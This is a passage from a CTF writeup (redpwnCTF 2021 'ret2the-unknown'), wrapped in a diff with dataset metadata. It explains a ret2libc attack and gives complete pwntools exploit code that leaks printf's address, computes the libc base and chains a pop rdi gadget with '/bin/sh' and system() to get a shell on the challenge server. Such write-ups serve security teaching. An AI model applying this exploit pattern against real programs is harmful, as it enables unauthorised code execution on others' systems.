@@ -1,0 +1,13 @@
+---
+SOURCE: livesearch
+URL: https://ctftime.org/writeup/29290
+CHALLENGE: CTFtime.org / redpwnCTF 2021 / ret2the-unknown / Writeup
+EVENT: LiveSearch
+TEAM: N/A
+CATEGORY: rop_chain
+DIFFICULTY: Unknown
+PROTECTIONS: None
+KEY_FUNCTIONS: printf, system
+KEY_TECHNIQUE: exploit  = b"A" * (32+8)                               # Padding to get to ret.
+---
+ gadget is located at this base address *plus* `0x023a5f`. We can search through the libc for `"/bin/sh"` and `system` with pwntools now that we've declared its base address. We of course need to remember our padding as well to slide over to the return address. Parts 5-8, done: ```python exploit  = b"B" * (32+8) exploit += p64(libc.address + POP_RDI_RET) exploit += p64(next(libc.search(b"/bin/sh"))) exploit += p64(libc.symbols["system"]) ``` Our final exploit code will look something like the following: ```python #!/usr/bin/env python3 from pwn import * # Gadget offsets. POP_RDI_RET = 0x00023a5f # pop rdi; ret; # Remote switch. REMOTE = True def main(): # Load the files. vuln = ELF("./ret2the-unknown") libc = ELF("./ libc-2.28.so ") # Connect to the target. if REMOTE: p = remote(" mc.ax ", 31568) else: p = process("./ret2the-unknown", env={"LD_PRELOAD": "./ libc-2.28.so "}) # Overwrite ret. addr. with main's addr. exploit  = b"A" * (32+8)                               # Padding to get to ret. exploit += p64(0x401186)                               # main() address overwrites ret. log.info ("Overwriting return address with main.") p.recvuntil("safely?") p.sendline(exploit) # main should repeat and give us printf addr. p.recvuntil("there: ") printf_addr = p.recvuntil("luck!").decode("utf-8").split("\n")[0] # Calculate the offsets and addresses. printf_addr   = int(printf_addr, 16)                   # Load the printf address. libc.address  = printf_addr - libc.symbols["printf"]   # Calculate and set the libc address. # Create the exploit that overwrites ret. addr. with shellcode. exploit  = b"B" * (32+8)                               # Padding to get to ret. exploit += p64(libc.address + POP_RDI_RET)             # Gadget: pop rdi; ret; exploit += p64(next(libc.search(b"/bin/sh")))          # Pass /bin/sh. exploit += p64(libc.symbols["system"])                 # Call system(). # Send the exploit. log.info ("Delivering exploit.") p.recvuntil("safely?") p.sendline(exploit)
